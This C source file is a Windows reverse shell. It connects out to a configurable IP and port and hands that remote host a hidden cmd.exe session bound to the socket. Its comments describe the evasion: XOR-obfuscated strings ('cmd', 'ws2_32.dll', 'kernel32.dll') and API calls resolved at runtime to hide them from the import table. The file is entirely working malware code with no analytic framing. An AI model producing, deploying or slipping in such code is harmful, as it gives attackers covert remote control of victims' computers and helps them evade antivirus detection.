#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"0.0.0.0"
# define CLIENT_PORT (int)0
#endif
/* ================================================== */

// XOR key for simple obfuscation
#define XOR_KEY 0x5A

// Function to decrypt strings
void xor_decrypt(char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

// Typedefs for dynamic API resolution
typedef int (WSAAPI *lpWSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *lpWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef int (WSAAPI *lpConnect)(SOCKET, const struct sockaddr *, int);
typedef unsigned long (WSAAPI *lpInet_addr)(const char *);
typedef u_short (WSAAPI *lpHtons)(u_short);
typedef BOOL (WINAPI *lpCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef void (WINAPI *lpSleep)(DWORD);

int main(void) {
    // Obfuscated "cmd" string (XORed with 0x5A)
    char cmd_str[] = {0x39, 0x37, 0x3E, 0x00}; 
    
    // Obfuscated "ws2_32.dll"
    char ws2_dll[] = {0x2D, 0x29, 0x68, 0x05, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36, 0x00};
    
    // Obfuscated "kernel32.dll"
    char k32_dll[] = {0x31, 0x3F, 0x28, 0x34, 0x3F, 0x36, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36, 0x00};

    // Decrypt strings at runtime
    xor_decrypt(cmd_str, 3);
    xor_decrypt(ws2_dll, 10);
    xor_decrypt(k32_dll, 12);

    // Load Libraries Dynamically
    HMODULE hWs2 = LoadLibraryA(ws2_dll);
    HMODULE hK32 = GetModuleHandleA(k32_dll); 

    if (!hWs2 || !hK32) return 1;

    // Resolve Functions Dynamically (Hides from IAT)
    lpWSAStartup pWSAStartup = (lpWSAStartup)GetProcAddress(hWs2, "WSAStartup");
    lpWSASocketA pWSASocketA = (lpWSASocketA)GetProcAddress(hWs2, "WSASocketA");
    lpConnect pConnect = (lpConnect)GetProcAddress(hWs2, "connect");
    lpInet_addr pInet_addr = (lpInet_addr)GetProcAddress(hWs2, "inet_addr");
    lpHtons pHtons = (lpHtons)GetProcAddress(hWs2, "htons");
    lpCreateProcessA pCreateProcessA = (lpCreateProcessA)GetProcAddress(hK32, "CreateProcessA");
    lpSleep pSleep = (lpSleep)GetProcAddress(hK32, "Sleep");

    if (!pWSAStartup || !pWSASocketA || !pConnect || !pCreateProcessA) return 1;

    // Logic
	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
		return (1);
	}

	WSADATA wsaData;
	if (pWSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		return (1);
	}

	struct sockaddr_in sa;
	SOCKET sockt = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = pHtons(CLIENT_PORT);
	sa.sin_addr.s_addr = pInet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
	while (pConnect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		pSleep(5000);
	}
#else
	if (pConnect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		return (1);
	}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	
    // Use the decrypted cmd string
	pCreateProcessA(NULL, cmd_str, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}
